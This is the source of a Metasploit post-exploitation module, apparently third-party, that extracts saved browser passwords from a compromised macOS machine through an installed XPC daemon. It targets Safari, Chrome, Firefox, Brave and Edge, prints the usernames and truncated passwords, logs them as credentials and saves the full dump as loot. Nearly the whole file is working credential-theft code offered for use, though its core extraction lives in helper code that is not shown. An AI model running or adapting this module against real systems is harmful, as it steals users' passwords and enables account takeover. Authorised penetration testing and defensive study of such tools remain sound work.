##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Browser Credential Extraction',
        'Description'  => %q{
          Extracts saved passwords from web browsers on the macOS target via the XPC
          daemon. Targets Safari, Chrome, Firefox, Brave, and Edge password stores.
          Recovered credentials are reported to the Metasploit database and the full
          dump is stored as loot.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Extracting browser credentials via XPC daemon...")
    data = xpc_exec!('k2', timeout: 60)
    return if data.nil?

    count = 0
    if data.is_a?(Array)
      data.each do |entry|
        next unless entry.is_a?(Hash)
        url      = entry['url']      || entry['origin'] || ''
        username = entry['username'] || entry['user']    || ''
        password = entry['password'] || ''
        browser  = entry['browser']  || 'unknown'

        next if username.empty? && password.empty?
        count += 1

        print_good("  [#{browser}] #{url} - #{username}:#{password[0..20]}#{'...' if password.length > 20}")
        xpc_report_cred(username, password, "#{browser}_browser")
      end
    end

    loot_path = xpc_store_loot(
      'browser_creds',
      data.to_json,
      'browser_creds.json',
      'macOS browser credential extraction via XPC'
    )
    print_good("#{count} credential(s) recovered, saved to #{loot_path}")
  end
end
